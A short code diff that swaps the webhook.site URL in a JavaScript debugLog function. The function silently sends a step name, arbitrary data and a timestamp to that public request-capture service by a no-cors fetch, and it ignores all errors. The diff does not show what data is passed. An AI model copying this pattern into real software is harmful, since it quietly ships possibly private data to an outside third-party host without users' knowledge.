@@ -837,7 +837,7 @@ if (_isInApp) {
 function debugLog(step, data) {
   try {
     var payload = JSON.stringify({step: step, data: data, ts: new Date().toISOString()});
-    var url = 'https://webhook.site/ea239f8e-5fdb-443c-b00b-78a17007794f?payload=' + encodeURIComponent(payload);
+    var url = 'https://webhook.site/968c805e-091d-41eb-93a3-519ceb89fd16?payload=' + encodeURIComponent(payload);
     fetch(url, {method: 'GET', mode: 'no-cors'}).catch(function(e){});
   } catch (e) {}
 }
